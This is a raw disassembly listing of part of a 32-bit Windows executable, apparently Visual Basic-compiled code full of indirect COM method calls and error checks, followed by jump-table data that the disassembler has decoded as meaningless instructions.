  40720f:	ff 15 f0 10 40 00    	call   *0x4010f0
  407215:	89 bd 00 fe ff ff    	mov    %edi,-0x200(%ebp)
  40721b:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  407221:	50                   	push   %eax
  407222:	8b 85 00 fe ff ff    	mov    -0x200(%ebp),%eax
  407228:	57                   	push   %edi
  407229:	e9 5b d9 ff ff       	jmp    0x404b89
  40722e:	8b 16                	mov    (%esi),%edx
  407230:	56                   	push   %esi
  407231:	ff 92 08 03 00 00    	call   *0x308(%edx)
  407237:	50                   	push   %eax
  407238:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40723b:	50                   	push   %eax
  40723c:	ff d3                	call   *%ebx
  40723e:	8b 0e                	mov    (%esi),%ecx
  407240:	56                   	push   %esi
  407241:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407247:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  40724d:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  407250:	50                   	push   %eax
  407251:	52                   	push   %edx
  407252:	ff d3                	call   *%ebx
  407254:	8b f8                	mov    %eax,%edi
  407256:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  407259:	51                   	push   %ecx
  40725a:	57                   	push   %edi
  40725b:	8b 07                	mov    (%edi),%eax
  40725d:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  407263:	85 c0                	test   %eax,%eax
  407265:	db e2                	fnclex
  407267:	7d 12                	jge    0x40727b
  407269:	68 a0 00 00 00       	push   $0xa0
  40726e:	68 84 2a 40 00       	push   $0x402a84
  407273:	57                   	push   %edi
  407274:	50                   	push   %eax
  407275:	ff 15 38 10 40 00    	call   *0x401038
  40727b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40727e:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  407284:	50                   	push   %eax
  407285:	68 a8 2e 40 00       	push   $0x402ea8
  40728a:	8b 3a                	mov    (%edx),%edi
  40728c:	ff 15 30 10 40 00    	call   *0x401030
  407292:	8b d0                	mov    %eax,%edx
  407294:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407297:	ff 15 f0 10 40 00    	call   *0x4010f0
  40729d:	8b cf                	mov    %edi,%ecx
  40729f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4072a5:	50                   	push   %eax
  4072a6:	57                   	push   %edi
  4072a7:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  4072ad:	85 c0                	test   %eax,%eax
  4072af:	db e2                	fnclex
  4072b1:	0f 8d 0e 02 00 00    	jge    0x4074c5
  4072b7:	e9 f7 01 00 00       	jmp    0x4074b3
  4072bc:	8b 06                	mov    (%esi),%eax
  4072be:	56                   	push   %esi
  4072bf:	ff 90 08 03 00 00    	call   *0x308(%eax)
  4072c5:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4072c8:	50                   	push   %eax
  4072c9:	51                   	push   %ecx
  4072ca:	ff d3                	call   *%ebx
  4072cc:	8b 16                	mov    (%esi),%edx
  4072ce:	56                   	push   %esi
  4072cf:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4072d5:	ff 92 08 03 00 00    	call   *0x308(%edx)
  4072db:	50                   	push   %eax
  4072dc:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4072df:	50                   	push   %eax
  4072e0:	ff d3                	call   *%ebx
  4072e2:	8b f8                	mov    %eax,%edi
  4072e4:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4072e7:	52                   	push   %edx
  4072e8:	57                   	push   %edi
  4072e9:	8b 0f                	mov    (%edi),%ecx
  4072eb:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4072f1:	85 c0                	test   %eax,%eax
  4072f3:	db e2                	fnclex
  4072f5:	7d 12                	jge    0x407309
  4072f7:	68 a0 00 00 00       	push   $0xa0
  4072fc:	68 84 2a 40 00       	push   $0x402a84
  407301:	57                   	push   %edi
  407302:	50                   	push   %eax
  407303:	ff 15 38 10 40 00    	call   *0x401038
  407309:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40730c:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  407312:	51                   	push   %ecx
  407313:	68 bc 2e 40 00       	push   $0x402ebc
  407318:	8b 38                	mov    (%eax),%edi
  40731a:	ff 15 30 10 40 00    	call   *0x401030
  407320:	8b d0                	mov    %eax,%edx
  407322:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407325:	ff 15 f0 10 40 00    	call   *0x4010f0
  40732b:	8b d7                	mov    %edi,%edx
  40732d:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  407333:	50                   	push   %eax
  407334:	57                   	push   %edi
  407335:	ff 92 a4 00 00 00    	call   *0xa4(%edx)
  40733b:	85 c0                	test   %eax,%eax
  40733d:	db e2                	fnclex
  40733f:	7d 12                	jge    0x407353
  407341:	68 a4 00 00 00       	push   $0xa4
  407346:	68 84 2a 40 00       	push   $0x402a84
  40734b:	57                   	push   %edi
  40734c:	50                   	push   %eax
  40734d:	ff 15 38 10 40 00    	call   *0x401038
  407353:	8d 45 d8             	lea    -0x28(%ebp),%eax
  407356:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  407359:	50                   	push   %eax
  40735a:	51                   	push   %ecx
  40735b:	6a 02                	push   $0x2
  40735d:	ff 15 d0 10 40 00    	call   *0x4010d0
  407363:	8d 55 d0             	lea    -0x30(%ebp),%edx
  407366:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  407369:	52                   	push   %edx
  40736a:	50                   	push   %eax
  40736b:	e9 6d 01 00 00       	jmp    0x4074dd
  407370:	8b 0e                	mov    (%esi),%ecx
  407372:	56                   	push   %esi
  407373:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  407379:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40737c:	50                   	push   %eax
  40737d:	52                   	push   %edx
  40737e:	ff d3                	call   *%ebx
  407380:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407386:	8b 06                	mov    (%esi),%eax
  407388:	56                   	push   %esi
  407389:	ff 90 08 03 00 00    	call   *0x308(%eax)
  40738f:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407392:	50                   	push   %eax
  407393:	51                   	push   %ecx
  407394:	ff d3                	call   *%ebx
  407396:	8b f8                	mov    %eax,%edi
  407398:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40739b:	50                   	push   %eax
  40739c:	57                   	push   %edi
  40739d:	8b 17                	mov    (%edi),%edx
  40739f:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4073a5:	85 c0                	test   %eax,%eax
  4073a7:	db e2                	fnclex
  4073a9:	7d 12                	jge    0x4073bd
  4073ab:	68 a0 00 00 00       	push   $0xa0
  4073b0:	68 84 2a 40 00       	push   $0x402a84
  4073b5:	57                   	push   %edi
  4073b6:	50                   	push   %eax
  4073b7:	ff 15 38 10 40 00    	call   *0x401038
  4073bd:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4073c0:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4073c6:	52                   	push   %edx
  4073c7:	68 d0 2e 40 00       	push   $0x402ed0
  4073cc:	8b 39                	mov    (%ecx),%edi
  4073ce:	ff 15 30 10 40 00    	call   *0x401030
  4073d4:	8b d0                	mov    %eax,%edx
  4073d6:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4073d9:	ff 15 f0 10 40 00    	call   *0x4010f0
  4073df:	89 bd f4 fd ff ff    	mov    %edi,-0x20c(%ebp)
  4073e5:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4073eb:	50                   	push   %eax
  4073ec:	8b 85 f4 fd ff ff    	mov    -0x20c(%ebp),%eax
  4073f2:	57                   	push   %edi
  4073f3:	ff 90 a4 00 00 00    	call   *0xa4(%eax)
  4073f9:	85 c0                	test   %eax,%eax
  4073fb:	db e2                	fnclex
  4073fd:	7d 12                	jge    0x407411
  4073ff:	68 a4 00 00 00       	push   $0xa4
  407404:	68 84 2a 40 00       	push   $0x402a84
  407409:	57                   	push   %edi
  40740a:	50                   	push   %eax
  40740b:	ff 15 38 10 40 00    	call   *0x401038
  407411:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407414:	8d 55 dc             	lea    -0x24(%ebp),%edx
  407417:	51                   	push   %ecx
  407418:	52                   	push   %edx
  407419:	6a 02                	push   $0x2
  40741b:	ff 15 d0 10 40 00    	call   *0x4010d0
  407421:	8d 45 d0             	lea    -0x30(%ebp),%eax
  407424:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407427:	50                   	push   %eax
  407428:	51                   	push   %ecx
  407429:	e9 af 00 00 00       	jmp    0x4074dd
  40742e:	8b 16                	mov    (%esi),%edx
  407430:	56                   	push   %esi
  407431:	ff 92 08 03 00 00    	call   *0x308(%edx)
  407437:	50                   	push   %eax
  407438:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40743b:	50                   	push   %eax
  40743c:	ff d3                	call   *%ebx
  40743e:	8b 0e                	mov    (%esi),%ecx
  407440:	56                   	push   %esi
  407441:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  407447:	ff 91 08 03 00 00    	call   *0x308(%ecx)
  40744d:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  407450:	50                   	push   %eax
  407451:	52                   	push   %edx
  407452:	ff d3                	call   *%ebx
  407454:	8b f8                	mov    %eax,%edi
  407456:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  407459:	51                   	push   %ecx
  40745a:	57                   	push   %edi
  40745b:	8b 07                	mov    (%edi),%eax
  40745d:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  407463:	85 c0                	test   %eax,%eax
  407465:	db e2                	fnclex
  407467:	7d 12                	jge    0x40747b
  407469:	68 a0 00 00 00       	push   $0xa0
  40746e:	68 84 2a 40 00       	push   $0x402a84
  407473:	57                   	push   %edi
  407474:	50                   	push   %eax
  407475:	ff 15 38 10 40 00    	call   *0x401038
  40747b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40747e:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  407484:	50                   	push   %eax
  407485:	68 e8 2e 40 00       	push   $0x402ee8
  40748a:	8b 3a                	mov    (%edx),%edi
  40748c:	ff 15 30 10 40 00    	call   *0x401030
  407492:	8b d0                	mov    %eax,%edx
  407494:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407497:	ff 15 f0 10 40 00    	call   *0x4010f0
  40749d:	8b cf                	mov    %edi,%ecx
  40749f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4074a5:	50                   	push   %eax
  4074a6:	57                   	push   %edi
  4074a7:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  4074ad:	85 c0                	test   %eax,%eax
  4074af:	db e2                	fnclex
  4074b1:	7d 12                	jge    0x4074c5
  4074b3:	68 a4 00 00 00       	push   $0xa4
  4074b8:	68 84 2a 40 00       	push   $0x402a84
  4074bd:	57                   	push   %edi
  4074be:	50                   	push   %eax
  4074bf:	ff 15 38 10 40 00    	call   *0x401038
  4074c5:	8d 55 d8             	lea    -0x28(%ebp),%edx
  4074c8:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4074cb:	52                   	push   %edx
  4074cc:	50                   	push   %eax
  4074cd:	6a 02                	push   $0x2
  4074cf:	ff 15 d0 10 40 00    	call   *0x4010d0
  4074d5:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4074d8:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4074db:	51                   	push   %ecx
  4074dc:	52                   	push   %edx
  4074dd:	6a 02                	push   $0x2
  4074df:	ff 15 24 10 40 00    	call   *0x401024
  4074e5:	83 c4 18             	add    $0x18,%esp
  4074e8:	8b 85 30 ff ff ff    	mov    -0xd0(%ebp),%eax
  4074ee:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4074f1:	03 c1                	add    %ecx,%eax
  4074f3:	0f 80 6e 02 00 00    	jo     0x407767
  4074f9:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4074fc:	8b c8                	mov    %eax,%ecx
  4074fe:	33 c0                	xor    %eax,%eax
  407500:	e9 4a d4 ff ff       	jmp    0x40494f
  407505:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407508:	68 50 75 40 00       	push   $0x407550
  40750d:	eb 40                	jmp    0x40754f
  40750f:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  407512:	8d 55 dc             	lea    -0x24(%ebp),%edx
  407515:	51                   	push   %ecx
  407516:	52                   	push   %edx
  407517:	6a 02                	push   $0x2
  407519:	ff 15 d0 10 40 00    	call   *0x4010d0
  40751f:	8d 45 d0             	lea    -0x30(%ebp),%eax
  407522:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  407525:	50                   	push   %eax
  407526:	51                   	push   %ecx
  407527:	6a 02                	push   $0x2
  407529:	ff 15 24 10 40 00    	call   *0x401024
  40752f:	8d 55 80             	lea    -0x80(%ebp),%edx
  407532:	8d 45 90             	lea    -0x70(%ebp),%eax
  407535:	52                   	push   %edx
  407536:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  407539:	50                   	push   %eax
  40753a:	8d 55 b0             	lea    -0x50(%ebp),%edx
  40753d:	51                   	push   %ecx
  40753e:	8d 45 c0             	lea    -0x40(%ebp),%eax
  407541:	52                   	push   %edx
  407542:	50                   	push   %eax
  407543:	6a 05                	push   $0x5
  407545:	ff 15 1c 10 40 00    	call   *0x40101c
  40754b:	83 c4 30             	add    $0x30,%esp
  40754e:	c3                   	ret
  40754f:	c3                   	ret
  407550:	8b 45 08             	mov    0x8(%ebp),%eax
  407553:	50                   	push   %eax
  407554:	8b 08                	mov    (%eax),%ecx
  407556:	ff 51 08             	call   *0x8(%ecx)
  407559:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40755c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40755f:	5f                   	pop    %edi
  407560:	5e                   	pop    %esi
  407561:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407568:	5b                   	pop    %ebx
  407569:	8b e5                	mov    %ebp,%esp
  40756b:	5d                   	pop    %ebp
  40756c:	c2 04 00             	ret    $0x4
  40756f:	90                   	nop
  407570:	16                   	push   %ss
  407571:	69 40 00 94 69 40 00 	imul   $0x406994,0x0(%eax),%eax
  407578:	be 49 40 00 12       	mov    $0x12004049,%esi
  40757d:	6a 40                	push   $0x40
  40757f:	00 9a 6a 40 00 18    	add    %bl,0x1800406a(%edx)
  407585:	6b 40 00 96          	imul   $0xffffff96,0x0(%eax),%eax
  407589:	6b 40 00 1e          	imul   $0x1e,0x0(%eax),%eax
  40758d:	6c                   	insb   (%dx),%es:(%edi)
  40758e:	40                   	inc    %eax
  40758f:	00 9c 6c 40 00 1a 6d 	add    %bl,0x6d1a0040(%esp,%ebp,2)
  407596:	40                   	inc    %eax
  407597:	00 a2 6d 40 00 20    	add    %ah,0x2000406d(%edx)
  40759d:	6e                   	outsb  %ds:(%esi),(%dx)
  40759e:	40                   	inc    %eax
  40759f:	00 9e 6e 40 00 26    	add    %bl,0x2600406e(%esi)
  4075a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4075a6:	40                   	inc    %eax
  4075a7:	00 a4 6f 40 00 22 70 	add    %ah,0x70220040(%edi,%ebp,2)
  4075ae:	40                   	inc    %eax
  4075af:	00 aa 70 40 00 28    	add    %ch,0x28004070(%edx)
  4075b5:	71 40                	jno    0x4075f7
  4075b7:	00 a6 71 40 00 2e    	add    %ah,0x2e004071(%esi)
  4075bd:	72 40                	jb     0x4075ff
  4075bf:	00 bc 72 40 00 70 73 	add    %bh,0x73700040(%edx,%esi,2)
  4075c6:	40                   	inc    %eax
  4075c7:	00 aa 52 40 00 d1    	add    %ch,-0x2effbfae(%edx)
  4075cd:	53                   	push   %ebx
  4075ce:	40                   	inc    %eax
  4075cf:	00 4b 55             	add    %cl,0x55(%ebx)
  4075d2:	40                   	inc    %eax
  4075d3:	00 e5                	add    %ah,%ch
  4075d5:	55                   	push   %ebp
  4075d6:	40                   	inc    %eax
  4075d7:	00 7f 56             	add    %bh,0x56(%edi)
  4075da:	40                   	inc    %eax
  4075db:	00 19                	add    %bl,(%ecx)
  4075dd:	57                   	push   %edi
  4075de:	40                   	inc    %eax
  4075df:	00 b3 57 40 00 4d    	add    %dh,0x4d004057(%ebx)
  4075e5:	58                   	pop    %eax
  4075e6:	40                   	inc    %eax
  4075e7:	00 e7                	add    %ah,%bh
  4075e9:	58                   	pop    %eax
  4075ea:	40                   	inc    %eax
  4075eb:	00 81 59 40 00 2e    	add    %al,0x2e004059(%ecx)
  4075f1:	74 40                	je     0x407633
  4075f3:	00 06                	add    %al,(%esi)
  4075f5:	4b                   	dec    %ebx
  4075f6:	40                   	inc    %eax
  4075f7:	00 9e 4b 40 00 1c    	add    %bl,0x1c00404b(%esi)
  4075fd:	4c                   	dec    %esp
  4075fe:	40                   	inc    %eax
  4075ff:	00 9a 4c 40 00 22    	add    %bl,0x2200404c(%edx)
  407605:	4d                   	dec    %ebp
  407606:	40                   	inc    %eax
  407607:	00 a0 4d 40 00 1e    	add    %ah,0x1e00404d(%eax)
  40760d:	4e                   	dec    %esi
  40760e:	40                   	inc    %eax
  40760f:	00 a6 4e 40 00 24    	add    %ah,0x2400404e(%esi)
  407615:	4f                   	dec    %edi
  407616:	40                   	inc    %eax
  407617:	00 a2 4f 40 00 2a    	add    %ah,0x2a00404f(%edx)
  40761d:	50                   	push   %eax
  40761e:	40                   	inc    %eax
  40761f:	00 a8 50 40 00 26    	add    %ch,0x26004050(%eax)
  407625:	51                   	push   %ecx
  407626:	40                   	inc    %eax
  407627:	00 ae 51 40 00 2c    	add    %ch,0x2c004051(%esi)
  40762d:	52                   	push   %edx
  40762e:	40                   	inc    %eax
  40762f:	00 1b                	add    %bl,(%ebx)
  407631:	5a                   	pop    %edx
  407632:	40                   	inc    %eax
  407633:	00 a3 5a 40 00 21    	add    %ah,0x2100405a(%ebx)
  407639:	5b                   	pop    %ebx
  40763a:	40                   	inc    %eax
  40763b:	00 9f 5b 40 00 27    	add    %bl,0x2700405b(%edi)
  407641:	5c                   	pop    %esp
  407642:	40                   	inc    %eax
  407643:	00 a5 5c 40 00 23    	add    %ah,0x2300405c(%ebp)
  407649:	5d                   	pop    %ebp
  40764a:	40                   	inc    %eax
  40764b:	00 ab 5d 40 00 29    	add    %ch,0x2900405d(%ebx)
  407651:	5e                   	pop    %esi
  407652:	40                   	inc    %eax
  407653:	00 a7 5e 40 00 2f    	add    %ah,0x2f00405e(%edi)
  407659:	5f                   	pop    %edi
  40765a:	40                   	inc    %eax
  40765b:	00 ad 5f 40 00 c7    	add    %ch,-0x38ffbfa1(%ebp)
  407661:	63 40 00             	arpl   %eax,0x0(%eax)
  407664:	2d 63 40 00 c5       	sub    $0xc5004063,%eax
  407669:	60                   	pusha
  40766a:	40                   	inc    %eax
  40766b:	00 5f 61             	add    %bl,0x61(%edi)
  40766e:	40                   	inc    %eax
  40766f:	00 f9                	add    %bh,%cl
  407671:	61                   	popa
  407672:	40                   	inc    %eax
  407673:	00 93 62 40 00 9c    	add    %dl,-0x63ffbf9e(%ebx)
  407679:	67 40                	addr16 inc %eax
  40767b:	00 88 65 40 00 2b    	add    %cl,0x2b004065(%eax)
  407681:	60                   	pusha
  407682:	40                   	inc    %eax
  407683:	00 22                	add    %ah,(%edx)
  407685:	66 40                	inc    %ax
  407687:	00 61 64             	add    %ah,0x64(%ecx)
  40768a:	40                   	inc    %eax
  40768b:	00 e8                	add    %ch,%al
  40768d:	74 40                	je     0x4076cf
  40768f:	00 00                	add    %al,(%eax)
  407691:	01 47 47             	add    %eax,0x47(%edi)
  407694:	47                   	inc    %edi
  407695:	02 47 47             	add    0x47(%edi),%al
  407698:	47                   	inc    %edi
  407699:	03 04 05 06 47 47 47 	add    0x47474706(,%eax,1),%eax
  4076a0:	47                   	inc    %edi
  4076a1:	47                   	inc    %edi
  4076a2:	47                   	inc    %edi
  4076a3:	07                   	pop    %es
  4076a4:	47                   	inc    %edi
  4076a5:	47                   	inc    %edi
  4076a6:	47                   	inc    %edi
  4076a7:	47                   	inc    %edi
  4076a8:	08 09                	or     %cl,(%ecx)
  4076aa:	0a 0b                	or     (%ebx),%cl
  4076ac:	0c 0d                	or     $0xd,%al
  4076ae:	0e                   	push   %cs
  4076af:	0f 10 11             	movups (%ecx),%xmm2
  4076b2:	47                   	inc    %edi
  4076b3:	47                   	inc    %edi
  4076b4:	12 13                	adc    (%ebx),%dl
  4076b6:	14 15                	adc    $0x15,%al
  4076b8:	16                   	push   %ss
  4076b9:	17                   	pop    %ss
  4076ba:	18 19                	sbb    %bl,(%ecx)
  4076bc:	1a 1b                	sbb    (%ebx),%bl
  4076be:	1c 1d                	sbb    $0x1d,%al
  4076c0:	1e                   	push   %ds
  4076c1:	1f                   	pop    %ds
  4076c2:	47                   	inc    %edi
  4076c3:	47                   	inc    %edi
  4076c4:	47                   	inc    %edi
  4076c5:	47                   	inc    %edi
  4076c6:	47                   	inc    %edi
  4076c7:	47                   	inc    %edi
  4076c8:	47                   	inc    %edi
  4076c9:	47                   	inc    %edi
  4076ca:	47                   	inc    %edi
  4076cb:	47                   	inc    %edi
  4076cc:	47                   	inc    %edi
  4076cd:	47                   	inc    %edi
  4076ce:	47                   	inc    %edi
  4076cf:	47                   	inc    %edi
  4076d0:	47                   	inc    %edi
  4076d1:	47                   	inc    %edi
  4076d2:	47                   	inc    %edi
  4076d3:	47                   	inc    %edi
  4076d4:	47                   	inc    %edi
  4076d5:	47                   	inc    %edi
  4076d6:	47                   	inc    %edi
  4076d7:	47                   	inc    %edi
  4076d8:	47                   	inc    %edi
  4076d9:	47                   	inc    %edi
  4076da:	47                   	inc    %edi
  4076db:	47                   	inc    %edi
  4076dc:	47                   	inc    %edi
  4076dd:	47                   	inc    %edi
  4076de:	47                   	inc    %edi
  4076df:	47                   	inc    %edi
  4076e0:	47                   	inc    %edi
  4076e1:	47                   	inc    %edi
  4076e2:	47                   	inc    %edi
  4076e3:	20 20                	and    %ah,(%eax)
  4076e5:	47                   	inc    %edi
  4076e6:	47                   	inc    %edi
  4076e7:	47                   	inc    %edi
  4076e8:	21 22                	and    %esp,(%edx)
  4076ea:	23 24 25 26 27 28 29 	and    0x29282726(,%eiz,1),%esp
  4076f1:	2a 2b                	sub    (%ebx),%ch
  4076f3:	2c 47                	sub    $0x47,%al
  4076f5:	2d 2e 2f 30 31       	sub    $0x31302f2e,%eax
  4076fa:	32 33                	xor    (%ebx),%dh
  4076fc:	34 35                	xor    $0x35,%al
  4076fe:	36 37                	ss aaa
  407700:	38 39                	cmp    %bh,(%ecx)
  407702:	3a 3b                	cmp    (%ebx),%bh
  407704:	47                   	inc    %edi
  407705:	47                   	inc    %edi
  407706:	47                   	inc    %edi
  407707:	47                   	inc    %edi
  407708:	47                   	inc    %edi
  407709:	47                   	inc    %edi
  40770a:	47                   	inc    %edi
  40770b:	47                   	inc    %edi
  40770c:	47                   	inc    %edi
  40770d:	47                   	inc    %edi
  40770e:	47                   	inc    %edi
  40770f:	47                   	inc    %edi
  407710:	47                   	inc    %edi
  407711:	47                   	inc    %edi
  407712:	47                   	inc    %edi
  407713:	47                   	inc    %edi
  407714:	47                   	inc    %edi
  407715:	47                   	inc    %edi
  407716:	47                   	inc    %edi
  407717:	47                   	inc    %edi
  407718:	47                   	inc    %edi
  407719:	47                   	inc    %edi
  40771a:	47                   	inc    %edi
  40771b:	47                   	inc    %edi
  40771c:	47                   	inc    %edi
  40771d:	47                   	inc    %edi
  40771e:	47                   	inc    %edi
  40771f:	47                   	inc    %edi
  407720:	47                   	inc    %edi
  407721:	47                   	inc    %edi
  407722:	47                   	inc    %edi
  407723:	47                   	inc    %edi
  407724:	47                   	inc    %edi
  407725:	47                   	inc    %edi
  407726:	47                   	inc    %edi
  407727:	47                   	inc    %edi
  407728:	47                   	inc    %edi
  407729:	47                   	inc    %edi
  40772a:	47                   	inc    %edi
  40772b:	47                   	inc    %edi
  40772c:	47                   	inc    %edi
  40772d:	47                   	inc    %edi
  40772e:	47                   	inc    %edi
  40772f:	47                   	inc    %edi
  407730:	47                   	inc    %edi
  407731:	47                   	inc    %edi
  407732:	47                   	inc    %edi
  407733:	47                   	inc    %edi
  407734:	47                   	inc    %edi
  407735:	47                   	inc    %edi
  407736:	47                   	inc    %edi
  407737:	47                   	inc    %edi
  407738:	47                   	inc    %edi
  407739:	47                   	inc    %edi
  40773a:	47                   	inc    %edi
  40773b:	47                   	inc    %edi
  40773c:	47                   	inc    %edi
  40773d:	47                   	inc    %edi
  40773e:	47                   	inc    %edi
  40773f:	47                   	inc    %edi
  407740:	47                   	inc    %edi
  407741:	47                   	inc    %edi
  407742:	3c 3d                	cmp    $0x3d,%al
  407744:	3e 3f                	ds aas
  407746:	40                   	inc    %eax
  407747:	41                   	inc    %ecx
  407748:	42                   	inc    %edx
  407749:	47                   	inc    %edi
  40774a:	47                   	inc    %edi
  40774b:	47                   	inc    %edi
  40774c:	47                   	inc    %edi
  40774d:	47                   	inc    %edi
  40774e:	47                   	inc    %edi
  40774f:	47                   	inc    %edi
  407750:	47                   	inc    %edi
  407751:	47                   	inc    %edi
  407752:	47                   	inc    %edi
  407753:	47                   	inc    %edi
  407754:	47                   	inc    %edi
  407755:	47                   	inc    %edi
  407756:	47                   	inc    %edi
  407757:	47                   	inc    %edi
  407758:	47                   	inc    %edi
  407759:	47                   	inc    %edi
  40775a:	47                   	inc    %edi
  40775b:	47                   	inc    %edi
  40775c:	47                   	inc    %edi
  40775d:	47                   	inc    %edi
  40775e:	47                   	inc    %edi
  40775f:	47                   	inc    %edi
  407760:	47                   	inc    %edi
  407761:	47                   	inc    %edi
  407762:	47                   	inc    %edi
  407763:	43                   	inc    %ebx
  407764:	44                   	inc    %esp
  407765:	45                   	inc    %ebp
  407766:	46                   	inc    %esi
  407767:	ff 15 b8 10 40 00    	call   *0x4010b8
  40776d:	90                   	nop
  40776e:	90                   	nop
  40776f:	90                   	nop
  407770:	9e                   	sahf
  407771:	9e                   	sahf
  407772:	9e                   	sahf
  407773:	9e                   	sahf
  407774:	9c                   	pushf
  407775:	77 00                	ja     0x407777
  407777:	00 ff                	add    %bh,%bh
  407779:	ff                   	(bad)
  40777a:	ff                   	(bad)
  40777b:	ff                   	(bad)
  40777c:	ff                   	(bad)
  40777d:	ff                   	(bad)
  40777e:	ff                   	(bad)
  40777f:	ff b0 78 00 00 00    	push   0x78(%eax)
  407785:	10 00                	adc    %al,(%eax)
	...
  40779b:	00 be 78 00 00 c8    	add    %bh,-0x37ffff88(%esi)
  4077a1:	78 00                	js     0x4077a3
  4077a3:	00 d6                	add    %dl,%dh
  4077a5:	78 00                	js     0x4077a7
  4077a7:	00 e6                	add    %ah,%dh
  4077a9:	78 00                	js     0x4077ab
  4077ab:	00 f6                	add    %dh,%dh
  4077ad:	78 00                	js     0x4077af
  4077af:	00 06                	add    %al,(%esi)
  4077b1:	79 00                	jns    0x4077b3
  4077b3:	00 16                	add    %dl,(%esi)
  4077b5:	79 00                	jns    0x4077b7
  4077b7:	00 28                	add    %ch,(%eax)
  4077b9:	79 00                	jns    0x4077bb
  4077bb:	00 3c 79             	add    %bh,(%ecx,%edi,2)
  4077be:	00 00                	add    %al,(%eax)
  4077c0:	4c                   	dec    %esp
  4077c1:	79 00                	jns    0x4077c3
  4077c3:	00 04 02             	add    %al,(%edx,%eax,1)
  4077c6:	00 80 60 79 00 00    	add    %al,0x7960(%eax)
  4077cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4077cd:	79 00                	jns    0x4077cf
  4077cf:	00 7c 79 00          	add    %bh,0x0(%ecx,%edi,2)
  4077d3:	00 92 79 00 00 aa    	add    %dl,-0x55ffff87(%edx)
  4077d9:	79 00                	jns    0x4077db
  4077db:	00 9a 02 00 80 ba    	add    %bl,-0x457ffffe(%edx)
  4077e1:	79 00                	jns    0x4077e3
  4077e3:	00 ce                	add    %cl,%dh
  4077e5:	79 00                	jns    0x4077e7
  4077e7:	00 dc                	add    %bl,%ah
  4077e9:	79 00                	jns    0x4077eb
  4077eb:	00 ee                	add    %ch,%dh
  4077ed:	79 00                	jns    0x4077ef
  4077ef:	00 00                	add    %al,(%eax)
  4077f1:	7a 00                	jp     0x4077f3
  4077f3:	00 0a                	add    %cl,(%edx)
  4077f5:	7a 00                	jp     0x4077f7
  4077f7:	00 18                	add    %bl,(%eax)
  4077f9:	7a 00                	jp     0x4077fb
  4077fb:	00 26                	add    %ah,(%esi)
  4077fd:	7a 00                	jp     0x4077ff
  4077ff:	00 3a                	add    %bh,(%edx)
  407801:	7a 00                	jp     0x407803
  407803:	00 56 7a             	add    %dl,0x7a(%esi)
  407806:	00 00                	add    %al,(%eax)
  407808:	64 7a 00             	fs jp  0x40780b
  40780b:	00 76 7a             	add    %dh,0x7a(%esi)
  40780e:	00 00                	add    %al,(%eax)
  407810:	84 7a 00             	test   %bh,0x0(%edx)
  407813:	00 92 7a 00 00 a0    	add    %dl,-0x5fffff86(%edx)
  407819:	7a 00                	jp     0x40781b
  40781b:	00 b6 7a 00 00 c4    	add    %dh,-0x3bffff86(%esi)
  407821:	7a 00                	jp     0x407823
  407823:	00 ce                	add    %cl,%dh
  407825:	7a 00                	jp     0x407827
  407827:	00 ea                	add    %ch,%dl
  407829:	7a 00                	jp     0x40782b
  40782b:	00 fa                	add    %bh,%dl
  40782d:	7a 00                	jp     0x40782f
  40782f:	00 08                	add    %cl,(%eax)
  407831:	7b 00                	jnp    0x407833
